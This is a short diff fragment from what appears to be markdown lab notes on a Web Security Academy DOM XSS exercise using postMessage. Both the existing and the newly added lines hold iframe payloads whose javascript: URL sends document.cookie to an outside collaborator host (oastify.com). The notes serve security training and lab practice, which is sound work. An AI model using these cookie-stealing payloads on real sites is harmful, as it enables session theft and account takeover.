@@ -301,7 +301,10 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
     "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
 }), "*");'>
 
-```  
+```
+```html
+<iframe src=https://0a9b0095033ea0248419fa5500da0025.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch(`https://0tu3gghzbghpn3ci0c2495i43v9mxkl9.oastify.com/?data=`+document.cookie)\"}","*")'>
+```
 
 >At the end of the iframe onload values is a "*", this is to indicate the target is any.  
   
